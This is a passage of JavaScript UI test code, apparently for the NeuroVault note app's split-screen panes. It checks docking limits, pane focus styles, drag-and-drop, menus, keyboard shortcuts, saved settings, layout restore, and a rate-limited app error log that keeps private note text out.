    for (const k of ['typical', 'stress', 'empty']) { const t = defaultTabs(k); P.tabs[k] = t.map(x => x.kind).join(' ') || 'none'; if (t.some(x => x.kind !== 'note')) bad('a module tab at launch', `${k}: ${P.tabs[k]}`); }
    base(); { const n0 = S.tabs.length, at0 = S.activeTab;
      for (const v of PANE_MODS) { const rb = app.querySelector(`.rail [data-act="view"][data-v="${v}"]`); if (rb) rb.click(); else fire('view', v);
        const x = app.querySelector('.app-body > .main > .app-header [data-act="pn-close"]'), sel = app.querySelector('.ws-tab[aria-selected="true"]');
        P.tabs[v] = `${UI.view} · tabs ${S.tabs.length} · ${sel ? 'a tab selected' : 'no tab selected'} · × ${!!x}`;
        if (UI.view !== v || S.tabs.length !== n0 || S.tabs.some(t => t.kind !== 'note' && t.kind !== 'newtab') || sel || !x) bad('a rail click opens the module in the main area, no tab, with a ×', `${v}: ${P.tabs[v]}`); }
      app.querySelector('.app-body > .main > .app-header [data-act="pn-close"]').click(); P.tabs.closed = `${UI.view} ${S.activeTab === at0}`;
      if (UI.view !== 'notes' || S.activeTab !== at0 || S.offTab) bad('× on a module puts the note tab back', P.tabs.closed); }

    // 2 · docking at each screen and each "How panes split": three panes at most, each at least 360 × 240, side by side or stacked
    for (const split of ['auto', 'side', 'stacked']) for (const sc of Object.keys(SCREENS)) {
      PANE_SET.split = split; base({ screen: sc }); const got = [];
      for (const v of ['tasks', 'timer', 'history']) { pnDock(v, 'beside'); got.push(pnAll().length); }
      const sz = sizes(), cols = PN.cols.length, rows = Math.max(...PN.cols.map(c => c.rows.length)), key = `${split}/${sc}`;
      P.dock[key] = `${got.join('→')} panes · ${cols} col × ${rows} high · ${sz.map(s => s.join('×')).join(' ')}`;
      if (pnAll().length > PANE_MAX) bad('more than three panes', key);
      if (sz.some(([w, h]) => w < PANE_MIN.w - 1 || h < PANE_MIN.h - 1)) bad('a pane under 360 × 240', P.dock[key]);
      if (split === 'side' && rows > 1) bad('side by side stacked a pane', P.dock[key]);
      if (split === 'stacked' && cols > 1) bad('stacked put a pane beside', P.dock[key]);
      if (split === 'auto' && rows > 2) bad('Automatic went three high', P.dock[key]);
      if (got[0] !== 2 && !(split === 'side' && sc === 'portrait1080')) bad('the first module did not dock', P.dock[key]);
      if (split === 'side' && sc === 'portrait1080' && got[0] !== 1) bad('portrait has no room beside', P.dock[key]);
      measure('R44 dock ' + key); app.querySelectorAll('.pane .view').forEach(v => { if (v.scrollWidth > v.clientWidth + 1) bad('a pane scrolls sideways', key); });
      if (pnAll().length === PANE_MAX) { const n = pnAll().length; pnDock('dict', 'beside'); if (pnAll().length !== n || !/most|room/.test(S.status)) bad('a fourth pane is refused with the reason', `${key}: ${S.status}`); }
      out.combos++; }
    PANE_SET.split = 'auto';
    { base(); pnDock('tasks', 'beside'); const o = pnAll().length; pnDock('tasks', 'below'); P.dock.moved = `${o} → ${pnAll().length} · ${PN.cols.length} cols`;
      if (pnAll().filter(p => p.v === 'tasks').length !== 1) bad('docking an open module again moves it', P.dock.moved); }

    // 3 · the pane you work in (QC 4 · 42): each look × "Fade the other panes", with two and three panes, at 1920, 1366 and portrait.
    //     Frame, tint and underline show only for their own choice; the underline is a 2px accent line along the focused pane's header,
    //     like an open tab; the others fade (header and page at .62) only with the switch on; nothing above the panes moves, one weight
    const accent = (() => { const sp = document.createElement('span'); sp.style.color = 'var(--accent)'; app.appendChild(sp); const c = getComputedStyle(sp).color; sp.remove(); return c; })();
    for (const sc of ['1920x1080', '1366x768', 'portrait1080']) for (const n of [2, 3]) for (const fs of ['frame', 'tint', 'underline']) for (const fade of [false, true]) {
      PANE_SET.split = sc === 'portrait1080' && n === 3 ? 'stacked' : 'auto'; PANE_SET.fade = fade; look(fs); base({ screen: sc }); pnDock('tasks', 'beside'); if (n === 3) pnDock('timer', 'beside');
      const key = `${sc}/${n}/${fs}/${fade ? 'fade' : 'no fade'}`;
      if (pnAll().length !== n) { bad('the panes for the look check did not open', `${key}: ${paneSig()}`); continue; }
      const snap = () => ({ bar: app.querySelector('.titlebar').textContent.replace(/\s+/g, ' '), tab: rect(app.querySelector('.ws-tab[aria-selected="true"]')), insp: rect(app.querySelector('#right-sidebar, .inspector')), panes: [...app.querySelectorAll('.pane')].map(rect).join(' '), hdr: [...app.querySelectorAll('.pane > .app-header')].map(rect).join(' ') });
      const a = snap(); pnFocusPane('main'); const b = snap(); const diff = Object.keys(a).filter(k => a[k] !== b[k]);
      P.still[key] = diff.length ? 'moved: ' + diff.join(', ') : 'still'; if (diff.length) bad('something moved when the focus moved', `${key}: ${diff.join(', ')}`);
      const f = app.querySelector('.pane.is-focused'), others = [...app.querySelectorAll('.pane:not(.is-focused)')], o = others[0], hd = e => e.querySelector(':scope > .app-header'), cs = e => getComputedStyle(e);
      const frame = e => getComputedStyle(e, '::after').content !== 'none' && getComputedStyle(e, '::after').borderTopWidth === '2px';
      const line = e => cs(hd(e)).borderBottomColor === accent && /inset/.test(cs(hd(e)).boxShadow);
      const has = { frame: frame(f), tint: cs(hd(f)).backgroundColor !== cs(hd(o)).backgroundColor, underline: line(f) };
      const op = others.map(e => [cs(hd(e)).opacity, cs(e.querySelector(':scope > .pane-body')).opacity].join('/')), fop = cs(hd(f)).opacity + '/' + cs(f.querySelector(':scope > .pane-live')).opacity;
      const w = new Set([...app.querySelectorAll('.pane .app-header .crumb-text, .pane .app-header .crumb-label')].map(e => cs(e).fontWeight)), hh = new Set([...app.querySelectorAll('.pane > .app-header')].map(e => Math.round(e.getBoundingClientRect().height / pnZoom())));
      P.looks[key] = `${Object.entries(has).filter(x => x[1]).map(x => x[0]).join('+') || 'nothing'} · focused ${fop} · others ${op.join(' ')} · header ${[...hh]}px · weights ${[...w]}`;
      if (!has[fs] || Object.entries(has).some(([k, v]) => k !== fs && v)) bad('each look shows only itself', P.looks[key]);
      if (others.some(e => frame(e) || line(e))) bad('an unfocused pane has the frame or the underline', key);
      if (op.some(x => x !== (fade ? '0.62/0.62' : '1/1')) || fop !== '1/1') bad('the other panes fade only with "Fade the other panes" on', P.looks[key]);
      if (w.size > 1) bad('a pane header changes weight', P.looks[key]); if (hh.size > 1) bad('the headers differ in height (something moves)', P.looks[key]);
      if (app.querySelector('.pane-hint') || /Click to work here/.test(app.querySelector('.panes').textContent)) bad('"Click to work here" is back', key);
      out.combos++; }
    Object.assign(PANE_SET, { split: 'auto', fade: false }); look('frame');

    // 4 · one header and one × per pane; the rail shows what's open (pressed) and where you work (current)
    { base(); const t = mkTab('note', D.notes[2].id); S.tabs.push(t); pnSplitNote(t.id); pnDock('tasks', 'beside');
      const per = [...app.querySelectorAll('.pane')].map(p => `${p.dataset.paneView}: ${p.querySelectorAll(':scope > .app-header').length} header, ${p.querySelectorAll(':scope > .app-header [data-act="pn-close"]').length} ×`);
      P.heads.three = per.join(' · '); P.heads.shared = app.querySelectorAll('.app-body > .main > .app-header').length;
      [...app.querySelectorAll('.pane')].forEach(p => { const n = p.querySelectorAll(':scope > .app-header').length, x = p.querySelectorAll(':scope > .app-header [data-act="pn-close"]').length, main = p.dataset.pane === 'main';
        if (n !== 1 || x !== (main ? 0 : 1)) bad('one header and one × per pane', P.heads.three); });
      if (P.heads.shared) bad('a shared header row with panes open', P.heads.shared);
      if (S.tabs.some(x => x.id === t.id)) bad('a note split beside keeps its tab (two closes)', '');
      const pressed = [...app.querySelectorAll('.rail [aria-pressed="true"]')].map(b => b.dataset.v).join(' '), cur = [...app.querySelectorAll('.rail [aria-current]')].map(b => b.dataset.v).join(' ');
      P.heads.rail = `pressed ${pressed} · current ${cur}`; if (pressed !== 'notes tasks' || cur !== 'tasks') bad('the rail shows what is open and where you work', P.heads.rail);
      const tm = app.querySelector('.rail [data-v="tasks"]'); if (!/^Tasks \(open\) · drag beside a note to dock it · Ctrl\+Alt\+2$/.test(tm.title)) bad('the rail tooltip', tm.title); }

    // 5 · a real pointer drag: the zone, a refusal with its reason, Esc, the drop
    for (const sc of ['1920x1080', '1366x768', 'portrait1080']) {
      base({ screen: sc }); const b = app.querySelector('.rail [data-act="view"][data-v="timer"]'), br = b.getBoundingClientRect(), a = pnArea();
      const pt = (type, x, y, el = document) => el.dispatchEvent(new PointerEvent(type, { clientX: x, clientY: y, button: 0, buttons: 1, bubbles: true, cancelable: true, pointerId: 1 }));
      pt('pointerdown', br.left + 10, br.top + 10, b); pt('pointermove', br.left + 30, br.top + 30);
      pt('pointermove', a.right - 20, (a.top + a.bottom) / 2); const zr = app.querySelector('.pane-zone'), g = app.querySelector('.pane-ghost');
      const D1 = P.drag[sc] = { right: zr ? `${zr.dataset.zone} ${rect(zr)}` : `refused: ${g?.querySelector('.pane-why')?.textContent}` };
      if (!g) bad('no chip under the pointer', sc);
      if (sc === 'portrait1080' ? zr : !zr || zr.dataset.zone !== 'right') bad('the right half lights up (or is refused with a reason at portrait)', `${sc}: ${D1.right}`);
      document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true })); D1.esc = `${pnAll().length} pane, zone ${!!app.querySelector('.pane-zone')}`;
      pt('pointerup', a.right - 20, (a.top + a.bottom) / 2); await wait(0);
      if (pnAll().length !== 1 || app.querySelector('.pane-zone, .pane-ghost')) bad('Esc cancels a drag', `${sc}: ${D1.esc}`);
      pt('pointerdown', br.left + 10, br.top + 10, app.querySelector('.rail [data-act="view"][data-v="timer"]')); pt('pointermove', br.left + 30, br.top + 30); pt('pointermove', (a.left + a.right) / 2, a.bottom - 20);   // the rail was drawn again: its button anew
      D1.below = app.querySelector('.pane-zone')?.dataset.zone || 'none'; pt('pointerup', (a.left + a.right) / 2, a.bottom - 20); await wait(0);
      D1.dropped = paneSig(); if (D1.below !== 'bottom' || !/mod:timer@p\d/.test(D1.dropped) || PN.cols[0].rows.length !== 2) bad('a drop on the bottom edge docks below, with the focus', `${sc}: ${D1.below} ${D1.dropped}`);
      out.combos++; }
    { PANE_SET.split = 'side'; base({ screen: '1920x1080' }); const t = pnProbe({ v: 'timer' }, 'below'); P.drag.sideBelow = t?.blocked || 'allowed';
      if (!/side by side/.test(P.drag.sideBelow)) bad('"side by side" turns down the bottom edge, with the reason', P.drag.sideBelow);
      PANE_SET.split = 'stacked'; base({ screen: '1920x1080' }); const u = pnProbe({ v: 'timer' }, 'right'); P.drag.stackedRight = u?.blocked || 'allowed';
      if (!/stack/.test(P.drag.stackedRight)) bad('"stacked" turns down the side edges, with the reason', P.drag.stackedRight); PANE_SET.split = 'auto'; }

    // 6 · the rail icon's right-click menu (6px right of it, tops lined up) and a pane's ⋮ menu (under it, right edges lined up)
    for (const sc of ['1920x1080', '1366x768']) {
      base({ screen: sc }); let b = app.querySelector('.rail [data-v="timer"]');
      b.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: 5, clientY: 5 })); const m = app.querySelector('.pane-menu'), z = pnZoom(); b = app.querySelector('.rail [data-v="timer"]');   // drawn again with its menu
      const dx = m && Math.round((m.getBoundingClientRect().left - b.getBoundingClientRect().right) / z), dy = m && Math.round((m.getBoundingClientRect().top - b.getBoundingClientRect().top) / z);
      P.menus[sc] = `rail menu ${dx}px right, ${dy}px down · focus on "${document.activeElement?.textContent?.trim()}" · disabled: ${[...(m?.querySelectorAll('[disabled]') || [])].map(x => x.textContent.trim() + (x.title ? ' (' + x.title + ')' : '')).join('; ') || 'none'}`;
      if (!m || dx !== 6 || dy !== 0 || !document.activeElement?.closest('.pane-menu')) bad('the rail menu sits 6px right of its icon with the focus in it', P.menus[sc]);
      m.querySelector('[data-v="right"]:not([disabled]), [data-v="below"]:not([disabled])')?.click(); if (!pnOpenMod('timer') || pnOpenMod('timer').kind !== 'mod') bad('the rail menu docks the module', `${sc}: ${paneSig()}`);
      app.querySelector('[data-act="pn-menu"]').click(); const pb = app.querySelector('[data-act="pn-menu"]'), pm = app.querySelector('.pane-pmenu');
      const rx = pm && Math.round((pm.getBoundingClientRect().right - pb.getBoundingClientRect().right) / z), ty = pm && Math.round((pm.getBoundingClientRect().top - pb.getBoundingClientRect().bottom) / z);
      P.menus[sc] += ` · ⋮ menu right edge ${rx}, ${ty}px under`; if (!pm || Math.abs(rx) > 1 || ty !== 6) bad('the ⋮ menu sits under its button, right edges lined up', P.menus[sc]);
      document.activeElement?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true })); if (app.querySelector('.pane-pmenu') || !document.activeElement?.matches('[data-act="pn-menu"]')) bad('Esc closes the ⋮ menu, back on its button', sc);
      if (PN.cols.length > 1) { app.querySelector('[data-act="pn-menu"]').click(); app.querySelector('.pane-pmenu [data-act="pn-move"][data-v="left"]')?.click(); P.menus[sc] += ` · moved: ${paneSig()}`; if (PN.cols[0].rows[0].p.kind !== 'mod') bad('Move left', paneSig()); }
      app.querySelector('.pane [data-act="pn-close"]').click(); if (pnAll().length !== 1) bad('× closes the pane and gives its space back', paneSig());
      out.combos++; }

    // 7 · keys: F6 and Shift+F6 go round the panes; Ctrl+K docks; the line between panes moves with the arrows, never under 360px
    { base(); pnDock('tasks', 'beside'); const ord = [], f6 = sh => document.body.dispatchEvent(new KeyboardEvent('keydown', { key: 'F6', shiftKey: !!sh, bubbles: true, cancelable: true }));
      for (let i = 0; i < 3; i++) { f6(); ord.push(PN.focus); } f6(true); ord.push(PN.focus); P.keys.f6 = ord.join(' → ');
      if (ord.join() !== 'main,p1,main,p1') bad('F6 goes to the next pane, Shift+F6 back', P.keys.f6);
      pnReset(); renderAll(); openPalette(); S.pal.q = '>beside'; renderAll(); const i = S.pal.flat.findIndex(x => /Open Timer beside the note/.test(x.label)); P.keys.ctrlk = S.pal.flat.filter(x => /beside/.test(x.label)).map(x => x.label.replace('> ', '')).join(', ');
      if (i < 0) bad('Ctrl+K lists "Open … beside the note"', P.keys.ctrlk); else { runPalette(i); await wait(0); if (!pnOpenMod('timer') || pnOpenMod('timer').kind !== 'mod' || S.modal) bad('Ctrl+K docks Timer beside the note', paneSig()); }
      const d = app.querySelector('[data-pane-split]'), w0 = sizes()[0][0]; d.focus(); for (let k = 0; k < 30; k++) d.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowLeft', bubbles: true, cancelable: true }));
      renderAll(); const w1 = sizes()[0][0]; P.keys.line = `${w0} → ${w1}px`; if (!(w1 < w0) || Math.min(...sizes().map(s => s[0])) < PANE_MIN.w * .9) bad('the line moves with the arrows and keeps panes usable', P.keys.line); }

    // 8 · the note split: More → Split right (the same note beside), and a note tab dropped on the right edge
    { base(); S.menu = true; renderAll(); app.querySelector('.app-header .menu [data-act="split-right"]').click(); P.split.more = paneSig();
      if (pnAll().filter(p => p.kind === 'note').length !== 1 || app.querySelector('.app-header .menu')) bad('More → Split right opens the note beside', P.split.more);
      if (/Close the split/.test(app.textContent)) bad('"Close the split" is still in the menu', '');
      base(); const t = S.tabs[1], a = pnArea(), tab = app.querySelector(`[data-wstab="${t.id}"]`); S.tabDrag = t.id;
      const dt = (type, x, y, el) => el.dispatchEvent(new DragEvent(type, { clientX: x, clientY: y, bubbles: true, cancelable: true }));
      const over = document.elementFromPoint(a.right - 20, (a.top + a.bottom) / 2) || app.querySelector('.view'); dt('dragover', a.right - 20, (a.top + a.bottom) / 2, over);
      P.split.zone = app.querySelector('.pane-zone')?.dataset.zone || 'none'; dt('drop', a.right - 20, (a.top + a.bottom) / 2, over);
      P.split.tab = `${paneSig()} · tabs ${S.tabs.length}`; if (P.split.zone !== 'right' || pnAll().find(p => p.kind === 'note')?.ref !== t.ref || S.tabs.some(x => x.id === t.id)) bad('a note tab dropped on the right edge opens beside, out of the tabs', `${P.split.zone} ${P.split.tab}`); }

    // 9 · Settings → Editor → Split screen: three choices and the fade switch, with their defaults, saved; the look follows
    { base(); PANE_SET.focus = 'frame'; PANE_SET.split = 'auto'; PANE_SET.restore = 'last'; paneLook(); S.setSec = 'editor'; set({ modal: 'settings' });
      const card = app.querySelector('.settings-pane .pn-set'), groups = [...(card?.querySelectorAll('.seg') || [])].map(g => [...g.querySelectorAll('.seg-opt')].map(b => b.textContent + (b.getAttribute('aria-pressed') === 'true' ? '*' : '')).join('/'));
      P.settings.card = groups.join(' · ');
      if (P.settings.card !== 'Accent frame*/Tinted header/Underline on its tab · Automatic*/Side by side/Stacked · As I left it*/Notes only') bad('the Split screen card', P.settings.card);
      // QC 4 · 42: "Fade the other panes" is its own switch, right under the look, off by default; flat rows (no cards)
      const rows = [...card.querySelectorAll(':scope > .set-row')].map(r => r.querySelector('.set-label')?.textContent), tg = card.querySelector('[data-act="pn-fade"]');
      P.settings.rows = rows.join(' | ') + ` · fade ${tg?.getAttribute('aria-checked')}`;
      if (rows.join('|') !== 'Pane you work in|Fade the other panes|How panes split|When NeuroVault opens' || tg?.getAttribute('role') !== 'switch' || tg.getAttribute('aria-checked') !== 'false' || card.querySelector('.card, .cf-card')) bad('the Split screen rows', P.settings.rows);
      saved.length = 0; card.querySelector('[data-v="focus:underline"]').click(); app.querySelector('.settings-pane [data-act="pn-fade"]').click(); app.querySelector('.settings-pane [data-v="split:stacked"]').click(); app.querySelector('.settings-pane [data-v="restore:notes"]').click();
      P.settings.saved = saved.map(x => JSON.stringify(x)).join(' '); P.settings.body = `${document.body.dataset.paneFocus} ${document.body.dataset.paneFade} · switch ${app.querySelector('.settings-pane [data-act="pn-fade"]').getAttribute('aria-checked')}`;
      if (P.settings.saved !== '{"pane_focus_style":"underline"} {"pane_fade":true} {"pane_split":"stacked"} {"pane_restore":"notes"}' || P.settings.body !== 'underline on · switch true') bad('the choices save to config.json and apply', `${P.settings.saved} · ${P.settings.body}`);
      app.querySelector('.settings-pane [data-act="pn-fade"]').click(); if (PANE_SET.fade || document.body.dataset.paneFade !== 'off' || JSON.stringify(saved[saved.length - 1]) !== '{"pane_fade":false}') bad('the fade switch turns off again', document.body.dataset.paneFade);
      S.modal = null; Object.assign(PANE_SET, { focus: 'frame', fade: false, split: 'auto', restore: 'last' }); paneLook(); renderAll();
      // a config.json from before QC 4 · 42 (config.py migrates it; the page does too): "dim" opens as the frame with the fade on
      readerFromConfig({ pane_focus_style: 'dim' }); P.settings.dim = `${PANE_SET.focus} + fade ${PANE_SET.fade}`; if (PANE_SET.focus !== 'frame' || !PANE_SET.fade) bad('"dim" becomes the frame with the fade on', P.settings.dim);
      Object.assign(PANE_SET, { focus: 'frame', fade: false }); paneLook(); }

    // 10 · next launch: as you left it (checked and trimmed), or notes only
    { base({ screen: '1920x1080' }); const t = mkTab('note', D.notes[2].id); S.tabs.push(t); pnSplitNote(t.id); pnDock('timer', 'beside'); pnFocusPane(pnOpenMod('timer').id);
      const L = pnLayoutNow(), sig = paneSig(); P.restore.saved = JSON.stringify(L).length + ' chars';
      base(); PN.layout = L; resetVaultView(); renderAll(); P.restore.back = paneSig(); if (paneSig() !== sig.replace(/@p\d+$/, '@' + PN.focus) || UI.view !== 'timer') bad('the panes come back as you left them', `${sig} → ${paneSig()} (${UI.view})`);
      PANE_SET.restore = 'notes'; base(); resetVaultView(); renderAll(); P.restore.notes = paneSig(); if (pnAll().length !== 1 || S.tabs.some(x => x.kind !== 'note')) bad('"Notes only" opens with no panes', P.restore.notes); PANE_SET.restore = 'last';
      const bads = { twoMains: { ...L, cols: [...L.cols, { w: 1, rows: [{ h: 1, kind: 'main' }] }] }, four: { ...L, cols: [...L.cols, { w: 1, rows: [{ h: 1, kind: 'mod', v: 'dict' }] }] }, twice: { ...L, cols: L.cols.map(c => ({ ...c, rows: c.rows.map(r => r.kind === 'note' ? { h: 1, kind: 'mod', v: 'timer' } : r) })) } };
      for (const [k, B] of Object.entries(bads)) { base(); PN.layout = B; resetVaultView(); renderAll(); P.restore[k] = paneSig(); if (pnAll().length !== 1) bad('a layout that cannot be right starts fresh', `${k}: ${paneSig()}`); }
      base(); PN.layout = { ...L, tabs: ['gone-1', ...L.tabs], cols: L.cols.map(c => ({ ...c, rows: c.rows.map(r => r.kind === 'note' ? { ...r, ref: 'gone-2' } : r) })) }; resetVaultView(); renderAll();
      P.restore.missing = `${paneSig()} · tabs ${S.tabs.map(x => x.ref).join(' ')}`; if (pnAll().some(p => p.kind === 'note') || S.tabs.some(x => /^gone/.test(x.ref))) bad('a missing note is left out', P.restore.missing);
      base({ screen: '1366x768' }); PN.layout = { ...L, cols: [L.cols[0], { w: 1, rows: [{ h: 1, kind: 'mod', v: 'tasks' }] }, { w: 1, rows: [{ h: 1, kind: 'mod', v: 'timer' }] }] }; resetVaultView(); renderAll(); await wait(0);
      P.restore.fit = `${paneSig()} · ${sizes().map(s => s[0]).join(' ')}px · "${S.status}"`; if (sizes().some(s => s[0] < PANE_MIN.w - 1)) bad('a layout from a wider screen is trimmed to fit', P.restore.fit);
      PN.layout = null; }

    // Ctrl+Alt+N works with a docked module focused: the right sidebar is the note's
    { base(); pnDock('tasks', 'beside'); const i0 = UI.inspector; document.body.dispatchEvent(new KeyboardEvent('keydown', { key: 'n', code: 'KeyN', ctrlKey: true, altKey: true, bubbles: true, cancelable: true }));
      P.keys.insp = `${i0} → ${UI.inspector} (${UI.view})`; if (UI.inspector === i0) bad('Ctrl+Alt+N hides the right sidebar of the note with a docked module focused', P.keys.insp); setUI('inspector', i0); }
    // 11 · zen shows only the pane you work in
    { base(); pnDock('tasks', 'beside'); set({ zen: 'on' }); P.keys.zen = `${app.querySelectorAll('.pane').length} panes, view ${UI.view}`; if (app.querySelector('.panes')) bad('zen shows only the pane you work in', P.keys.zen); set({ zen: 'off' }); }
    // 12 · QC 95 (the user at 3440 × 1440: "cannot seem to add more than 2 notes, but adding tasks or timeline is fine", and a stall
    //      dragging a note into split view): notes dock like modules, from a note tab or from the sidebar, as many as modules on
    //      each screen (the 360px maths against the Wide page width: no pane under 360 × 240, no sideways scroll, the page column held
    //      to its pane); a drop is one draw, well under a second; a 4th note, a centre drop and Zen each say why; Ctrl+N with a
    //      docked note focused opens in the main area and the docked note stays. Then the app log: page errors, unhandled
    //      rejections and stalls go to api.log_client with where they happened, at most 10 a minute, never long quoted text
    { const Q = P.qc95 = { notes: {}, log: {} }, wasRA = renderAll;
      const at = (el, ed) => { const r = el.getBoundingClientRect(); return ed === 'R' ? [r.right - 20, r.top + r.height / 2] : ed === 'B' ? [r.left + r.width / 2, r.bottom - 20] : [r.left + r.width / 2, r.top + r.height / 2]; };
      const dragNote = (src, el, ed) => { const [x, y] = at(el, ed), dt = new DataTransfer(), tg = document.elementFromPoint(x, y) || el;
        if (src.tab) S.tabDrag = src.tab; else S.drag = { kind: 'note', id: src.note };
        const ov = new DragEvent('dragover', { clientX: x, clientY: y, bubbles: true, cancelable: true, dataTransfer: dt }); tg.dispatchEvent(ov);
        const r = { prevented: ov.defaultPrevented, zone: app.querySelector('.pane-zone')?.dataset.zone || '', why: app.querySelector('.pane-ghost--note .pane-why')?.textContent || '' };
        let draws = 0; renderAll = function () { draws++; return wasRA.apply(this, arguments); };   // eslint-disable-line no-global-assign
        const t0 = performance.now(); try { tg.dispatchEvent(new DragEvent('drop', { clientX: x, clientY: y, bubbles: true, cancelable: true, dataTransfer: dt })); } finally { renderAll = wasRA; }   // eslint-disable-line no-global-assign
        Object.assign(r, { ms: Math.round(performance.now() - t0), draws }); S.tabDrag = null; S.drag = null; return r; };
      const last = () => [...app.querySelectorAll('.panes [data-pane]')].pop() || app.querySelector('.app-body > .main .view');
      try {
        for (const sc of Object.keys(SCREENS)) {
          base({ screen: sc }); for (const v of ['tasks', 'timer', 'history']) pnDock(v, 'beside'); const mods = pnAll().length;
          for (const how of ['tab', 'sidebar']) {
            base({ screen: sc }); S.a11y.width = 100; applyComfort();   // Wide, the default page width
            const ids = D.notes.slice(0, 4).map(n => n.id); S.tabs = ids.map(id => mkTab('note', id)); S.activeTab = S.tabs[0].id; S.noteId = ids[0]; renderAll();
            const src = k => how === 'tab' ? { tab: S.tabs.find(t => t.ref === ids[k])?.id } : { note: ids[k] }, steps = [];
            for (const k of [1, 2]) { let r = dragNote(src(k), last(), 'R'); if (!r.zone) r = dragNote(src(k), last(), 'B'); steps.push(r); }
            const n = pnAll().length, sz = sizes(), slow = Math.max(...steps.map(r => r.ms)), key = `${how}/${sc}`;
            const cols = [...app.querySelectorAll('.pane .view--note')].map(v => { const vi = v.querySelector('.view-inner'); return vi ? Math.round(vi.getBoundingClientRect().width - v.getBoundingClientRect().width) : 0; });
            Q.notes[key] = `${n} panes (modules ${mods}) · ${sz.map(s => s.join('×')).join(' ')} · drops ${steps.map(r => `${r.zone || r.why || '-'} ${r.ms}ms ${r.draws} draw`).join(', ')}`;
            if (n !== mods) bad('QC 95 notes dock as modules do (3 when there is room)', Q.notes[key]);
            if (sz.some(([w, h]) => w < PANE_MIN.w - 1 || h < PANE_MIN.h - 1)) bad('QC 95 a note pane under 360 × 240', Q.notes[key]);
            app.querySelectorAll('.pane .view').forEach(v => { if (v.scrollWidth > v.clientWidth + 1) bad('QC 95 a note pane scrolls sideways', key); });
            if (cols.some(d => d > 1)) bad('QC 95 the page column is wider than its pane', `${key}: ${cols.join(',')}`);
            if (steps.some(r => r.zone && (!r.prevented || r.draws !== 1)) || slow > 1000) bad('QC 95 a note drop is one draw, under a second, and the editor never takes it', Q.notes[key]);
            if (sc === '3440x1440') {   // the user's screen: a 4th note and a centre drop say why
              const f = dragNote(src(3), last(), 'R'), c = dragNote(src(3), last(), 'C'); Q.notes['why ' + how] = `4th "${f.why}" · centre "${c.why}" · ${pnAll().length} panes`;
              if (!/3 panes is the most/.test(f.why) || !/Drop on an edge/.test(c.why) || pnAll().length !== 3 || f.draws > 1 || c.draws > 1) bad('QC 95 a note that cannot go says why', Q.notes['why ' + how]); }
            measure(`QC 95 notes ${key}`); out.combos++; } }
        // Zen shows one pane: a note dropped there says so, and nothing docks out of sight
        base({ screen: '3440x1440' }); set({ zen: 'on' }); { const z = dragNote({ note: D.notes[1].id }, app.querySelector('.app-body > .main .view') || app.querySelector('.app-body > .main'), 'R');
          Q.notes.zen = `"${z.why}" · ${pnAll().length} pane`; if (!/Zen shows one pane/.test(z.why) || pnAll().length !== 1) bad('QC 95 Zen says it shows one pane', Q.notes.zen); } set({ zen: 'off' });
        // Ctrl+N with a docked note focused: the new note opens in the main area (a tab), the docked note stays
        base({ screen: '3440x1440' }); { const [a, b] = D.notes.slice(0, 2).map(n => n.id); S.tabs = [mkTab('note', a)]; S.activeTab = S.tabs[0].id; S.noteId = a; renderAll();
          dragNote({ note: b }, app.querySelector('.app-body > .main .view'), 'R'); const docked = pnAll().find(p => p.kind === 'note'), f0 = PN.focus, n0 = D.notes.length;
          await newItem('note'); const made = D.notes.length === n0 + 1 ? D.notes[0].id : null;
          Q.notes.ctrlN = `focus ${f0} → ${PN.focus} · docked ${docked?.ref === b ? 'kept' : docked?.ref} · main tab ${pnTab()?.ref === made ? 'the new note' : pnTab()?.ref}`;
          if (!made || f0 === 'main' || PN.focus !== 'main' || docked?.ref !== b || pnTab()?.ref !== made) bad('QC 95 Ctrl+N with a docked note focused keeps it docked', Q.notes.ctrlN);
          if (made) { D.notes = D.notes.filter(n => n.id !== made); S.tabs = S.tabs.filter(t => t.ref !== made); } }   // the sample's own scratch note, in memory only
        // the app log: errors, rejections and stalls, rate-limited, never long quoted text
        { const keepLog = { times: LOG95.times, seen: LOG95.seen, q: LOG95.q }, sent = [], keepPv = window.pywebview;
          window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { if (n === 'log_client') sent.push(a); return Promise.resolve({ status: 'success' }); } }) };
          Object.assign(LOG95, { times: [], seen: new Map(), q: [] });
          try {
            base(); window.dispatchEvent(new ErrorEvent('error', { message: 'TypeError: x is undefined', filename: 'http://localhost/js/panes.js?v=1', lineno: 12, colno: 3, error: new Error('x') }));
            window.dispatchEvent(new PromiseRejectionEvent('unhandledrejection', { promise: Promise.resolve(), reason: new Error('Nope') }));
            log95Stall(1500, 'test');
            log95('error', 'Bad text "my private note text that goes on and on and on"', '');
            { const k = errs.lastIndexOf('TypeError: x is undefined'); if (k >= 0) errs.splice(k, 1); }   // the test's own error event is not a script error
            const e1 = sent[0] || [], e2 = sent[1] || [], e3 = sent[2] || [], e4 = sent[3] || [];
            Q.log.lines = sent.map(a => `${a[0]}: ${a[1]} @ ${a[2]}`).join(' | ');
            if (e1[0] !== 'error' || e1[1] !== 'TypeError: x is undefined' || !/^panes\.js:12:3 .* · view notes · /.test(e1[2] || '')) bad('QC 95 a page error goes to the app log, with where', Q.log.lines);
            if (e2[1] !== 'Unhandled: Error: Nope' || e3[0] !== 'warn' || e3[1] !== 'The page stalled for 1.5 s' || !/^test · view /.test(e3[2] || '')) bad('QC 95 a rejection and a stall go to the app log', Q.log.lines);
            if (/private/.test(e4[1] || 'private')) bad('QC 95 long quoted text is never logged', e4[1]);
            log95('error', 'Bad text "my private note text that goes on and on and on"', ''); const again = sent.length;
            for (let k = 0; k < 12; k++) log95('info', 'line ' + k, '');
            Q.log.rate = `same line again ${again === 4 ? 'not sent' : 'sent'} · ${sent.length} sent in the minute · long frames ${(PerformanceObserver.supportedEntryTypes || []).includes('long-animation-frame') ? 'seen as they happen' : 'as long tasks'}`;
            if (again !== 4 || sent.length !== 10) bad('QC 95 the app log takes at most 10 a minute, a line once', Q.log.rate);
          } finally { window.pywebview = keepPv; Object.assign(LOG95, keepLog); }
          out.combos++; }
      } finally { renderAll = wasRA; S.tabDrag = null; S.drag = null; S.a11y.width = 100; applyComfort(); set({ zen: 'off' }); }   // eslint-disable-line no-global-assign
    }
  } finally {
    window.pywebview = was; Object.assign(PANE_SET, keepSet); paneLook(); PN.layout = null; pnReset(); S.modal = null; S.menu = false; renderAll();
  }
}
/* ==== end Build M · R44 ==== */
